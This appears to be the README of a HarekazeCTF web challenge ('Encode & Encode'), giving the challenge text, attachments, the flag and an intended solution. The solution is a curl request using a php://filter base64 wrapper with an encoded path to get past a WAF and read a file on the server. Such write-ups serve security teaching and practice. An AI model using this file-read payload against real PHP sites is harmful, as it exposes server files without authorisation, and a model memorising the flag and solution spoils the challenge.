# [Web 100] Encode & Encode
## Description
つよいWAFを作りました! これならフラグは読めないはず!

---

I made a strong WAF, so you definitely can't read the flag!

---

`http://(redacted)` ([server/Dockerfile](server/Dockerfile))

- [encode-and-encode.tar.xz](attachments/encode-and-encode.tar.xz)

## Intended Solution
- `curl "http://(target)/?page=php%3a//filter/convert.base64-encode/resource=/fl%61g"`

## Flag
```
HarekazeCTF{turutara_tattatta_ritta}
```